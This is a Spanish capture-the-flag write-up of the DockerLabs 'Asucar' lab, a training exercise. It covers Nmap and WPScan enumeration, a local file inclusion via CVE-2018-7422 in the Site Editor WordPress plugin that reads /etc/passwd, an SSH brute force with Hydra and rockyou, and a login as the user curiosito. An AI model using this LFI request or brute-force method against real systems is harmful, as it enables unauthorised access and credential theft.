![](adjuntos/Pasted%20image%2020260218031919.png)

# Asucar – DockerLabs

> Explotación práctica de un plugin vulnerable en WordPress (Site Editor 1.1.1) que permite Local File Inclusion (LFI), pivotando posteriormente a acceso SSH autenticado y compromiso del sistema dentro de un entorno contenerizado Docker.

---
## 1️⃣ Lab Information

- **Plataforma:** [DockerLabs](https://dockerlabs.es)
- **Tipo de entorno:** Contenedor Docker
- **Servicio objetivo:** WordPress 6.5.3 (Apache 2.4.59 – Debian)
- **Vulnerabilidad explotada:** CVE-2018-7422 – Local File Inclusion en plugin **Site Editor 1.1.1**, con posterior acceso SSH mediante credenciales débiles
- **Dificultad:** Media

### Habilidades demostradas

- Enumeración completa de servicios (Nmap)
- Identificación de Virtual Host (`asucar.dl`)
- Enumeración avanzada de WordPress (WPScan)
- Investigación de vulnerabilidades públicas (Exploit-DB)
- Explotación de Local File Inclusion (LFI)
- Lectura de `/etc/passwd` para enumeración de usuarios del sistema
- Ataque dirigido de fuerza bruta con Hydra
- Acceso interactivo vía SSH
- Post-explotación básica en entorno Linux

## 🐳 2️⃣ Despliegue

La máquina se despliega como contenedor mediante el script proporcionado:

```bash
sudo bash auto_deploy.sh asucar.tar
[+] Image loaded successfully 
[+] Container started 
[+] Assigned IP: 172.17.0.2
```

## 🔎 3️⃣ Enumeración

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 escaneo
```
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
```
## 4️⃣ Análisis

El escaneo identificó dos servicios expuestos:

- **22/tcp → SSH (OpenSSH 9.2p1)**
- **80/tcp → HTTP (Apache 2.4.59 – Debian)**

El acceso inicial por IP (`172.17.0.2`) mostró carga incompleta, indicando posible configuración basada en Virtual Host.

Mediante inspección del código fuente (`Ctrl + U`) se identificaron referencias al dominio interno `asucar.dl`, resolviéndose mediante modificación del archivo `/etc/hosts`.

Se confirma la presencia de **WordPress 6.5.3** como aplicación principal.

📌 En esta fase, el servicio HTTP se considera la superficie de ataque prioritaria debido a la exposición directa de un CMS dinámico.

## 5️⃣ Identificación y preparación del ataque

### 5.1 Enumeración de WordPress

Enumeración automática del CMS:
```bash
wpscan --url http://asucar.dl/ -e u,p
```
Salida relevante:
```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://asucar.dl/ [172.17.0.2]
[+] Started: Wed Feb 18 03:45:26 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.59 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://asucar.dl/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://asucar.dl/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://asucar.dl/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://asucar.dl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.3 identified (Insecure, released on 2024-05-07).
 | Found By: Rss Generator (Passive Detection)
 |  - http://asucar.dl/index.php/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>
 |  - http://asucar.dl/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://asucar.dl/wp-content/themes/twentytwentyfour/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://asucar.dl/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | [!] Directory listing is enabled
 | Style URL: http://asucar.dl/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://asucar.dl/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] site-editor
 | Location: http://asucar.dl/wp-content/plugins/site-editor/
 | Last Updated: 2017-05-02T23:34:00.000Z
 | [!] The version is out of date, the latest version is 1.1.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <========================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] wordpress
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://asucar.dl/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Feb 18 03:45:29 2026
[+] Requests Done: 54
[+] Cached Requests: 7
[+] Data Sent: 14.12 KB
[+] Data Received: 413.624 KB
[+] Memory used: 275.676 MB
[+] Elapsed time: 00:00:03
```

### 5.2 Análisis de la vulnerabilidad

El plugin identificado durante la enumeración fue:

- `site-editor`
- Versión: 1.1.1
- Última actualización: 2017

La investigación pública del componente reveló una vulnerabilidad asociada:

- **CVE-2018-7422**
- Tipo: **Local File Inclusion (LFI)**
- EDB-ID: 44340

El fallo afecta al archivo:
```bash
wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php
```

El parámetro `ajax_path` permite la inclusión arbitraria de archivos locales sin validación adecuada.

📌 Este comportamiento posibilita la lectura de archivos del sistema y la obtención de información sensible, facilitando el compromiso posterior del entorno.

## 6️⃣ Explotación

Se utilizó el PoC asociado a **CVE-2018-7422** para validar la vulnerabilidad LFI.

Solicitud realizada:
```bash
http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

Se obtuvo el contenido del archivo `/etc/passwd`, confirmando la inclusión arbitraria de archivos locales.

Fragmento relevante:
![](adjuntos/Pasted%20image%2020260218034859.png)

📌 Vulnerabilidad confirmada.

La lectura de `/etc/passwd` permitió identificar un usuario del sistema con shell válida (`curiosito`), habilitando un posible pivot hacia el servicio SSH expuesto.

## 7️⃣ Pivot a SSH

Tras la lectura de `/etc/passwd`, se identificó el siguiente usuario del sistema:
```bash
24 curiosito:x:1000:1000:curiosito:/home/curiosito:/bin/bash
```

Dado que:

- El puerto **22/tcp (SSH)** estaba expuesto
- El usuario posee **shell válida (`/bin/bash`)**

Se procedió a realizar un ataque dirigido de autenticación contra el servicio SSH.

### Ataque de fuerza bruta controlado
```bash
hydra -l curiosito -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

Credenciales válidas obtenidas:
```bash
[22][ssh] host: 172.17.0.2   login: curiosito   password: password1
```

## 8️⃣ Acceso SSH

Con las credenciales obtenidas, se estableció conexión directa al servicio SSH expuesto.
```bash
ssh curiosito@asucar.dl
```

Autenticación:
```bash
password1
```

Acceso concedido:
```bash
curiosito@asucar:~$
```

Verificación básica:
```bash
whoami | id
```

Salida:
```bas
uid=1000(curiosito) gid=1000(curiosito) groups=1000(curiosito)
```

📌 Se obtiene acceso interactivo al sistema como usuario estándar `curiosito`.

El compromiso deja de estar limitado al contexto web y pasa a nivel sistema, habilitando fase de post-explotación y posible escalada de privilegios.